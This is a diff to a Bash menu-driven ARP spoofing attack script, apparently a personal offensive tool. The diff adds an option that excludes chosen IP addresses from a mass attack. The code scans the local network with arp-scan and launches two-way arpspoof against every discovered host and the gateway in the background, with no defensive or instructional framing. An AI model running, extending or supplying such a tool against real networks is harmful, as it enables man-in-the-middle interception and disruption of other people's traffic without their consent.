@@ -1,5 +1,8 @@
 #!/bin/bash
 
+# Lista de IPs excluidas
+excluded_ips=()
+
 # Check if the required tools are available
 check_tools() {
     if ! [ -x "$(command -v $1)" ]; then
@@ -36,10 +39,11 @@ show_menu() {
     echo -e "\033[1;32m 2. Perform ARP attack on a specific IP\033[0m"
     echo -e "\033[1;32m 3. ARP attack status\033[0m"
     echo -e "\033[1;32m 4. Stop ARP attack\033[0m"
-    echo -e "\033[1;32m 5. Exit\033[0m"
+    echo -e "\033[1;32m 5. Exclude specific IPs from attack\033[0m"
+    echo -e "\033[1;32m 6. Exit\033[0m"
 }
 
-# Function to scan the network and perform ARP attack on all devices
+# Function to scan the network and perform ARP attack on all devices except excluded IPs
 scan_and_attack() {
     echo -e "\033[0;33m"
     read -p "Enter interface name (e.g., eth0, wlan0): " interface
@@ -53,14 +57,18 @@ scan_and_attack() {
     # Calculate the gateway address
     gateway=$(ip route | grep default | awk '{print $3}')
 
-    # ARP attack on all discovered IPs
+    # ARP attack on all discovered IPs except excluded ones
     echo "Performing ARP spoofing attack against all discovered hosts in background..."
     for ip in $ips; do
-        arpspoof -i "$interface" -t "$ip" "$gateway" > /dev/null 2>&1 &
-        arpspoof -i "$interface" -t "$gateway" "$ip" > /dev/null 2>&1 &
+        if [[ " ${excluded_ips[@]} " =~ " ${ip} " ]]; then
+            echo -e "\033[1;34mSkipping IP $ip (excluded)\033[0m"
+        else
+            arpspoof -i "$interface" -t "$ip" "$gateway" > /dev/null 2>&1 &
+            arpspoof -i "$interface" -t "$gateway" "$ip" > /dev/null 2>&1 &
+        fi
     done
 
-    echo -e "\033[1;32mARP spoofing attack launched against all discovered hosts.\033[0m"
+    echo -e "\033[1;32mARP spoofing attack launched against all discovered hosts (except excluded ones).\033[0m"
     echo -e "\033[0m"
 }
 
@@ -97,6 +105,38 @@ stop_attack() {
     echo -e "\033[1;31mARP attack stopped successfully.\033[0m"
 }
 
+# Function to exclude specific IPs from attack
+exclude_ips() {
+    echo -e "\033[0;33m"
+    read -p "Enter interface name (e.g., eth0, wlan0): " interface
+    echo -e "\033[1;31mScanning network for active hosts...\033[0m"
+    ips=$(arp-scan -I "$interface" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v "$(hostname -I)")
+
+    # Display the found IP addresses with index numbers
+    echo -e "\033[1;33mActive hosts on the network:\033[0m"
+    index=1
+    for ip in $ips; do
+        echo -e "\033[1;32m$index. $ip\033[0m"
+        ((index++))
+    done
+
+    # Ask the user which IPs to exclude by index
+    echo -e "\033[0;33m"
+    read -p "Enter the numbers of IPs to exclude (separated by space): " -a exclusion_indexes
+
+    # Exclude the selected IPs
+    index=1
+    for ip in $ips; do
+        if [[ " ${exclusion_indexes[@]} " =~ " $index " ]]; then
+            excluded_ips+=("$ip")
+            echo -e "\033[1;34mExcluding IP $ip\033[0m"
+        fi
+        ((index++))
+    done
+
+    echo -e "\033[1;32mThe following IP(s) have been excluded from the attack: ${excluded_ips[*]}\033[0m"
+}
+
 # Main program
 while true; do
     show_banner
@@ -108,7 +148,8 @@ while true; do
         2) attack_specific_ip ;;
         3) check_attack_status ;;
         4) stop_attack ;;
-        5) echo -e "\033[36mGoodbye!\033[0m"; exit ;;
+        5) exclude_ips ;;
+        6) echo -e "\033[36mGoodbye!\033[0m"; exit ;;
         *) echo -e "\033[1;31mInvalid option. Please try again.\033[0m" ;;
     esac
     read -p "Press Enter to continue..." # Pause until user presses Enter
